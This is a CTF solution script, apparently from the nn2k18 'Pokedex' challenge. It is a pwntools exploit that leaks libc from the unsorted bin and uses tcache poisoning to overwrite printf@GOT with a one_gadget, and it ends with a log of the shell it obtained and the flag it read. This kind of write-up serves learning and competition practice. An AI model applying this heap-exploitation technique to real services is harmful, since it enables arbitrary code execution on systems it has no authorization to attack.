#!/usr/bin/python
# coding: utf-8
#
# nn2k18 CTF - Pokedex
# Leak from unsorted bin + tcache poisoning (glibc >= 2.26)
# by @danigargu
#

import time
from pwn import *

host = 'challenges.ka0labs.org'
port = 1341

#context.log_level = 'debug'

def create(idx, name, height=0, weight=0, power=0, payload=False):
    r.sendlineafter('option> ', '1')
    r.sendlineafter('ID: ', str(idx))
    r.sendlineafter('Name: ', name)

    if not payload:
        r.sendlineafter('Height: ', str(height))
        r.sendlineafter('Weight: ', str(weight))
        r.sendlineafter('Power: ', str(power))
        time.sleep(1)

def delete(idx):
    r.sendlineafter('option> ', '3')
    r.sendlineafter('ID to delete: ', str(idx))
    time.sleep(1)

def view(idx):
    r.sendlineafter('option> ', '4')
    r.sendlineafter('ID to print: ', str(idx))
    r.recvuntil("Name: ")
    res = r.recvuntil("\n").strip()
    time.sleep(1)
    return res

def edit(idx, name, height=0, weight=0, power=0):
    r.sendlineafter('option> ', '2')
    r.sendlineafter('ID to edit: ', str(idx))  
    r.sendlineafter('name: ', name)
    r.sendlineafter('Height: ', str(height))
    r.sendlineafter('Weight: ', str(weight))
    r.sendlineafter('Power: ', str(power))
    time.sleep(1)


elf  = ELF('pokedex')
r = remote(host, port)
#r = process("./pokedex_nn2k18")

create(0, "A"*2000)
create(1, "A"*2000)

delete(0)

leak = u64(view(0).ljust(8, '\x00'))
libc_base = leak-0x1b7ca0
one_gadget = libc_base+0xe42ee

log.info("Leak from unsorted bin: 0x%X" % leak)
log.info("Libc base: 0x%X" % libc_base)

create(2, "A"*0x30)
delete(2)

log.info("Overwriting printf@GOT ...")
edit(2, p64(elf.got['printf']))
create(3, "A"*0x30)
create(4, p64(one_gadget) + "A"*(0x30-16), payload=True)
log.info("Got a shell? :)")

r.interactive()


"""
[*] Leak from unsorted bin: 0x7F9D7A5C6CA0
[*] Libc base: 0x7F9D7A40F000
[*] Overwriting printf@GOT ...
[*] Got a shell? :)
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000,24,25,29,30,44,46,108
$ ls -l
total 36
drwxr-xr-x 2 0 0  4096 Oct  3 18:19 bin
-rw-r--r-- 1 0 0    30 Oct  3 18:14 flag.txt
drwxr-xr-x 3 0 0  4096 Oct  3 17:11 lib
drwxr-xr-x 2 0 0  4096 Oct  3 17:10 lib64
-rwxr-xr-x 1 0 0 17232 Oct  3 18:37 pokedex
$ cat flag.txt
nn8ed{Tc4che_c0rrupt10n_FTW!}
$
"""


